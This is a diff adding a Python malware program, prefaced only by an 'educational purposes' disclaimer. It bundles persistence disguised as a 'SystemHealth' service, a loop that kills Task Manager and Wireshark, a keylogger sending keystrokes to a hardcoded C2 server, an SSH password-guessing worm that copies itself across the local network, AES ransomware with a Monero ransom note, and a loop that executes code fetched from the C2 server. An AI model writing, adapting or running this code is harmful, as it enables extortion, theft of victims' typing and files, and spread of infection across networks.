@@ -1,0 +1,130 @@
+# === THIS IS FOR EDUCATIONAL PURPOSES ONLY, IF YOU RUN THIS I AM NOT RESPONSIBLE FOR WHAT HAPPENSE ===
+import os
+import sys
+import platform
+import threading
+import requests
+from Crypto.Cipher import AES
+from pynput import keyboard
+import paramiko
+import subprocess
+import time
+
+# === CONFIG (HARDCODED) ===
+C2_URL = "http://185.231.116.44/cmd"
+AES_KEY = b'4hd7e89jf4hd7e89'  # Static key
+IV = b'0000000000000000'      # Reused IV
+TARGET_DIRS = ['Documents', 'Desktop', 'Downloads']
+SSH_PASSWORDS = ['admin', 'password', '123456', 'root']
+
+# === PERSISTENCE ===
+def add_persistence():
+    if platform.system() == 'Windows':
+        import winreg
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
+            winreg.SetValueEx(key, "SystemHealth", 0, winreg.REG_SZ, sys.argv[0])
+            winreg.CloseKey(key)
+        except: pass
+        os.system("attrib +h +s " + sys.argv[0])  # Hide file
+    else:
+        service = """
+        [Unit]
+        Description=System Health Check
+        [Service]
+        ExecStart=/usr/bin/python3 {}
+        Restart=always
+        [Install]
+        WantedBy=multi-user.target
+        """.format(sys.argv[0])
+        with open("/etc/systemd/system/systemd-health.service", "w") as f:
+            f.write(service)
+        os.system("systemctl enable systemd-health.service")
+
+# === KILL SECURITY TOOLS ===
+def kill_tools():
+    while True:
+        if platform.system() == 'Windows':
+            subprocess.call("taskkill /f /im Taskmgr.exe /im cmd.exe /im Wireshark.exe", shell=True)
+        else:
+            subprocess.call("killall -9 wireshark tcpdump", shell=True)
+        time.sleep(60)
+
+# === KEYLOGGER ===
+def on_press(key):
+    try: char = key.char
+    except: char = str(key)
+    with open(os.path.expanduser("~/update.log"), "a") as f:
+        f.write(char)
+    if os.path.getsize("~/update.log") > 1024:  # Exfil every 1KB
+        try:
+            with open(os.path.expanduser("~/update.log"), "rb") as log:
+                requests.post(C2_URL.replace('/cmd','/log'), data=log.read())
+            os.remove("~/update.log")
+        except: pass
+
+keylogger = keyboard.Listener(on_press=on_press)
+keylogger.start()
+
+# === PROPAGATION (SSH/WORM) ===
+def ssh_brute(ip):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    for password in SSH_PASSWORDS:
+        try:
+            ssh.connect(ip, port=22, username='root', password=password, timeout=5)
+            sftp = ssh.open_sftp()
+            sftp.put(sys.argv[0], '/tmp/.systemd-service')
+            ssh.exec_command('chmod +x /tmp/.systemd-service && /tmp/.systemd-service &')
+            sftp.close()
+            ssh.close()
+            break
+        except: pass
+
+def scan_and_infect():
+    while True:
+        local_network = "192.168.1."  # Modify as needed
+        for i in range(1, 255):
+            ip = local_network + str(i)
+            threading.Thread(target=ssh_brute, args=(ip,)).start()
+        time.sleep(3600)
+
+# === RANSOMWARE ===
+def encrypt_file(filepath):
+    cipher = AES.new(AES_KEY, AES.MODE_CBC, IV)
+    with open(filepath, 'rb') as f:
+        data = f.read()
+    padded_data = data + b' ' * (16 - len(data) % 16)
+    encrypted = cipher.encrypt(padded_data)
+    with open(filepath + ".LOCKED", 'wb') as f:
+        f.write(encrypted)
+    os.remove(filepath)
+
+def ransom():
+    note = "YOUR FILES ARE LOCKED. Send 1 XMR to 48z2... Contact: darkwebzx.onion"
+    for dir in TARGET_DIRS:
+        target = os.path.expanduser(f"~/{dir}")
+        for root, _, files in os.walk(target):
+            for file in files:
+                if not file.endswith(".LOCKED"):
+                    encrypt_file(os.path.join(root, file))
+    with open(os.path.expanduser("~/FILES_RESTORE.txt"), "w") as f:
+        f.write(note)
+
+# === C2 COMMAND LOOP ===
+def c2_loop():
+    while True:
+        try:
+            cmd = requests.get(C2_URL).text
+            exec(cmd)  # Direct code execution
+        except: pass
+        time.sleep(120)
+
+# === MAIN ===
+if __name__ == "__main__":
+    add_persistence()
+    threading.Thread(target=scan_and_infect).start()
+    threading.Thread(target=kill_tools).start()
+    threading.Thread(target=ransom).start()
+    c2_loop()
